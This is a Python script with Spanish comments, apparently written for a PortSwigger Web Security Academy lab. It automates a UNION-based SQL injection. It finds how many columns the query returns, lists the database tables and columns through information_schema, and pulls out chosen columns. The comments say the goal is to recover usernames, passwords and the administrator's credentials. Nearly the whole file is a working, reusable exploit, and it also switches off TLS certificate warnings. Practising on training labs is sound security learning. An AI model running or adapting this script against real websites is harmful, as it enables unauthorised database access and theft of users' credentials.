import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def obtener_respuesta(params):
    url = params['url']
    try:
        peticion = requests.get(url)
        return peticion
    except requests.ConnectionError:
        print("La URL es inválida, Terminando la ejecución de la aplicación.")
        sys.exit(-1)

def obtener_enlace_ataque(params):
    url = params['url']
    peticion = obtener_respuesta(params)
    html = peticion.text
    soup = BeautifulSoup(html, 'html.parser')
    section = soup.findAll('section')
    section_filtros = section[len(section)-1]
    enlaces = section_filtros.findAll('a')
    print("\nLista de enlaces de interes:\n")
    for i in range(1,len(enlaces)):
        print (str(i) + ". " + enlaces[i].contents[0])
    print("\n¿Desde que enlace desea realizar el ataque?: ", end="")
    enlace_ataque = int(input())
    return enlaces[enlace_ataque]['href']
    
def obtener_numero_columnas_tabla(params):
    url, path = params['url'], params['path']
    i=1
    sql_payload = "'+UNION+SELECT+NULL"
    while True:
        peticion = requests.get(url+path[1:]+sql_payload+"-- - ", verify=False)
        if peticion.status_code // 100 ==  2:
            print("\nInformación obtenida:\n")
            print('[+] Numero de columnas: %i' % i)
            return i 
        sql_payload = sql_payload+",NULL"
        i+=1
    return False

def diferencia_listas(lista_a, lista_b):
    if len(lista_a) > len(lista_b):
        lista_grande = lista_a
        lista_pequena = lista_b
    else:
        lista_grande = lista_b
        lista_pequena = lista_a
    
    lista_diferencias = []
    
    for elemento in lista_grande:
        if elemento not in lista_pequena:
            lista_diferencias.append(elemento)
            
    return lista_diferencias


def recuperar_lista_tablas(params):
    url, path, n_columnas = params['url'], params['path'], params['n_columnas']
    
    sql_payload = "'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--"
    respuesta_normal = requests.get(url + path[1:])
    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
    
    lista_th_normal = BeautifulSoup(respuesta_normal.text, 'html.parser').find_all('th')
    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, 'html.parser').find_all('th')
    
    lista_th_exploited = diferencia_listas(lista_th_normal,lista_th_vulnerada)
    
    return lista_th_exploited

    
def tabla_a_consultar(params):
    lista_tablas = params['lista_tablas']
    
    print("\nListado de tablas de la base de datos:\n")
    
    for i in range(1,len(lista_tablas)):
        print(str(i) + ". " + lista_tablas[i-1].get_text())
        
    print("Ingrese el numero de la tabla: ", end="")
    id_tabla = int(input())
    return (id_tabla - 1)

def detalles_columnas(params):
    url, path, lista_tablas, id_tabla = params['url'], params['path'], params['lista_tablas'], params['id_tabla']
    nombre_tabla = lista_tablas[id_tabla].get_text()
    sql_payload = "'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='"+nombre_tabla+"'-- - "
    
    respuesta_normal = requests.get(url + path[1:])
    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
    
    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, 'html.parser').find_all('th')
    lista_th_normal = BeautifulSoup(respuesta_normal.text, 'html.parser').find_all('th')
    
    lista_columnas = diferencia_listas(lista_th_normal,lista_th_vulnerada)
    
    print("\nColumnas de la tabla: " + nombre_tabla + "\n")       
    
    for i in range(1,len(lista_columnas)+1):
        print(str(i) + ": " + lista_columnas[i-1].get_text())
        
    return lista_columnas
    
def consultar_columnas(params):
    
    url, path, lista_tablas, id_tabla, lista_columnas = params['url'], params['path'], params['lista_tablas'], params['id_tabla'], params['lista_columnas']
    
    print("Ingrese las columnas a consultar")
    
    print("Columna 1: ", end="")
    columna_1 = int(input())
    
    print("Columna 2: ", end="")
    columna_2 = int(input())
    
    nombre_tabla = lista_tablas[id_tabla].get_text()
    
    nombre_columna_1 = lista_columnas[columna_1-1].get_text()
    nombre_columna_2 = lista_columnas[columna_2-1].get_text()
    
    sql_payload = "'+UNION+SELECT " + nombre_columna_1 + "," + nombre_columna_2 + " FROM " + nombre_tabla + "-- -"
    
    respuesta_normal = requests.get(url + path[1:])
    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
    
    print(respuesta_normal.text)
    print(respuesta_vulnerada.text)
    
    # lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, 'html.parser').find_all('th')
    # lista_th_normal = BeautifulSoup(respuesta_normal.text, 'html.parser').find_all('th')
    
    
    
    
def main():
    params = {}
    
    params['url'] = "https://0a1700bf03dfc79f80db35a7009300d5.web-security-academy.net/"
    
    print("\nAtaque de inyección SQL")
    # determinar numero de columnas
    if obtener_respuesta(params):
        print("[+] URL válida. Procediendo con la ejecución del script...")
    
    params['path'] = obtener_enlace_ataque(params)
    
    params['n_columnas'] = obtener_numero_columnas_tabla(params)
    
    # recuperar la lista de tablas
    params['lista_tablas'] = recuperar_lista_tablas(params)
    print(params['lista_tablas'])
    
    # encontrar el nombre de la tabla que contiene credenciales de usuario
    params['id_tabla'] = tabla_a_consultar(params)
    
    # recuperar detalles de las columnas de la tabla
    params['lista_columnas'] = detalles_columnas(params)
    
    # Encontrar el nombre de las columnas que contienen usuarios y passwords
    consultar_columnas(params)
    # Recuperar nombres de usuarios y passwords para todos los usuarios
    
    # Enncontrar credenciales del usuario administrador
    
if __name__ == "__main__":
    main()
